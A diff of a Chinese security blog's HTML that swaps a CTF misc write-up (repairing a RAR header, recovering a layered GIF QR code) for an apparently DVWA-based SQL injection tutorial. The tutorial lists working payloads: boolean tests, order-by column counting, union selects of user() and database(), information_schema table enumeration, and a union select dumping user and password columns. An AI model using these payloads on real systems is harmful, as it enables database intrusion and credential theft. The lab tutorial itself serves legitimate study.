@@ -22,7 +22,7 @@
 
   
 
-  <title>攻防世界simpleRAR | HappyCoder&#39;Home</title>
+  <title>SQL注入 | HappyCoder&#39;Home</title>
 
   
 
@@ -97,18 +97,18 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">攻防世界simpleRAR</h1>
+          <h1 class="title-wrap">SQL注入</h1>
           <h2 class="title-sub-wrap">
             <strong>zhangkaibin</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-01-09T11:14:55.000Z" itemprop="datePublished">2022-01-09</time>
+            <time  class="article-date" datetime="2022-01-11T06:29:39.000Z" itemprop="datePublished">2022-01-11</time>
           </h2>
           <ul class="wrap-list dark">
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/misc/">🏷️ misc</a></li>
+    <li><a href="/tags/web/">🏷️ web</a></li>
   
 </ul>
         </div>
@@ -132,60 +132,21 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        
-    <figure class="figure-image">
-      <img src="/picture/misc13.png" alt="" loading="lazy" />
-      <figcaption></figcaption>
-    </figure>
-  拿到压缩包里面只有一个flag.txt内容为flag is not here
-<p>把压缩包丢入010editor</p>
-
-    <figure class="figure-image">
-      <img src="/picture/misc10.png" alt="" loading="lazy" />
-      <figcaption></figcaption>
-    </figure>
-  
-<p>这是上一篇压缩文件分析中提到的的，有时候给出的RAR文件的头部各个字块会故意给错导致无法识别<br>文件块的第三个字节为类型块，也叫头类型<br>头类型是0x72表示是标记块<br>头类型是0x73表示是压缩文件头块<br>头类型是<font color='red'>0x74</font>表示是文件头块<br>头类型是0x75表示是注释头块</p>
-<p>因为flag.txt文件的内容为flag is not here，所以可以找到下一个文件的文件头，把7A改成74即可看到了secret.png</p>
-
-    <figure class="figure-image">
-      <img src="/picture/misc11.png" alt="" loading="lazy" />
-      <figcaption></figcaption>
-    </figure>
-  
-
-<p>查看exif无果，把secret丢入010editor中，文件头是gif类型的，更改后缀名(但其实不更改也可以正常打开，我也不知道为啥)，然后看不出来什么了。</p>
-<p>把图片丢入stegsolve中，更改颜色通道,看到了这个</p>
-
-    <figure class="figure-image">
-      <img src="/picture/misc12.png" alt="" loading="lazy" />
-      <figcaption></figcaption>
-    </figure>
-  
-<p>这里我还在想是不是高度错误了，尝试爆破宽高不知道为什么爆破不出来，不知道是不是因为是gif类型的</p>
-<p>看看题目双图层</p>
-<p>打开Photoshop，果然看到另一个图层保存为png后丢入stegsolve中</p>
-
-    <figure class="figure-image">
-      <img src="/picture/misc14.png" alt="" loading="lazy" />
-      <figcaption></figcaption>
-    </figure>
-  
-
-<p>合并就可以得到一张完整的二维码了，这里我发现了一个更方便的方法(因为我之前用ps和ppt试过)，就是用snipaste粘粘到桌面上就行了</p>
-
-    <figure class="figure-image">
-      <img src="/picture/misc9.png" alt="" loading="lazy" />
-      <figcaption></figcaption>
-    </figure>
-  
-
+        <h2 id="判断是否存在SQL注入漏洞"><a href="#判断是否存在SQL注入漏洞" class="headerlink" title="判断是否存在SQL注入漏洞"></a>判断是否存在SQL注入漏洞</h2><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=1#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=1#</font></p>
+<p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=2#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=2#</font></p>
+<p>两次尝试后1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞</p>
+<h2 id="如果利用SQL注入漏洞"><a href="#如果利用SQL注入漏洞" class="headerlink" title="如果利用SQL注入漏洞"></a>如果利用SQL注入漏洞</h2><h5 id="1、判断数据库列数-order-by-column-num"><a href="#1、判断数据库列数-order-by-column-num" class="headerlink" title="1、判断数据库列数  order by [column_num]"></a>1、判断数据库列数  order by [column_num]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 1 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 2 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 3 #</font>‘ </p>
+<p>当表中只有两列，order by 3就会出错</p>
+<h5 id="2、联合查询其他信息-union-select-sql1-sql2"><a href="#2、联合查询其他信息-union-select-sql1-sql2" class="headerlink" title="2、联合查询其他信息  union select [sql1] [sql2]"></a>2、联合查询其他信息  union select [sql1] [sql2]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select  user(),database()#</font>‘<br>用户输入的SQL语句，执行了MYSQL内置函数user()和database(),user()返回当前数据库连接用户，database()返回当前数据库名称</p>
+<h5 id="3、联合查询表-union-select-table-name-table-schema-from-information-schema-tables-where-table-schema-‘-database-name-’"><a href="#3、联合查询表-union-select-table-name-table-schema-from-information-schema-tables-where-table-schema-‘-database-name-’" class="headerlink" title="3、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’"></a>3、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union select table_name,table_schema  from  information_schema.tables  where  table_schema=’dvwa’#</font>‘<br>从information_schema数据库中查询dvwa数据库表<br>这一步是为了查询数据库中有哪些表，因为上一步查到了数据库的名称,这个dvwa就是上一步查询到的数据库的名称。我们想要看看这个数据库里面有什么东西，除了数据库名称根据实际进行更改，其他内容是固定不变的。</p>
+<h5 id="4、联合查询信息-union-query-sql"><a href="#4、联合查询信息-union-query-sql" class="headerlink" title="4、联合查询信息  union [query_sql]"></a>4、联合查询信息  union [query_sql]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select user,password  from  users#</font>‘<br>上一步查询到数据库中有哪些表，现在想要查看表中的内容。假设这里的users就是上一步中查到的表，猜测可能会有user和password这两个属性，查询user和password的值</p>
 
       </section>
 
       
       
         <nav class="article-nav">
+          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
@@ -194,21 +155,6 @@
       
         <a href="/2022/01/10/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/" itemprop="url">
           <h2 class="card-text--title text-ellipsis">RSA共模攻击和gmpy2、libnum常用函数</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
-          
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2022/01/09/misc%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">misc压缩文件处理</h2>
         </a>
       
       <div class="card-text--row">Older</div>
